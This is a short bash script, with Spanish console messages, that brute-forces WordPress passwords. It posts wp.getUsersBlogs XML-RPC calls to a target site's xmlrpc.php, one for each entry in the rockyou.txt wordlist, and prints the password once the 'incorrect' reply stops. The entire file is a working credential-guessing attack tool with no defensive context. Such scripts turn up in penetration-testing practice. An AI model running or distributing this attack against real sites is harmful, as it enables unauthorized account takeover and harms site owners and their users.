#!/bin/bash

function ctrl_c() {
  echo -e "\n\n\033[1;31m[!] Saliendo...\033[0m"
  exit 1
}

trap ctrl_c INT

while [[ $# -gt 0 ]]; do
  key="$1"

  case $key in
    -u|--user)
      user="$2"
      shift
      shift
      ;;
    --url)
      link="$2"
      shift
      shift
      ;;
    *)
      echo "Opción desconocida: $1"
      exit 1
      ;;
  esac
done

if [[ -z "$user" ]]; then
  echo -e "\033[1;33m[!] Por favor, introduce el nombre de usuario con -u o --user.\033[0m"
  exit 1
fi

if [[ -z "$link" ]]; then
  echo -e "\033[1;33m[!] Por favor, introduce la URL con --url.\033[0m"
  exit 1
fi

function createXML() {
  local password="$1"
  payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$user</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"

  echo "$payload" > file.xml
  response=$(curl -s -X POST "${link}/xmlrpc.php" -d@file.xml)
  if [ ! "$(echo "$response" | grep 'Incorrect username or password.')" ]; then
    echo -e "\033[1;32m[+] Contraseña para $user -> $password\033[0m"
    exit 0
  fi
  sleep 5
}

echo -e "\033[1;36m[*] Iniciando...\033[0m"

cat /usr/share/wordlists/rockyou.txt | while read -r password; do
  createXML "$password"
done
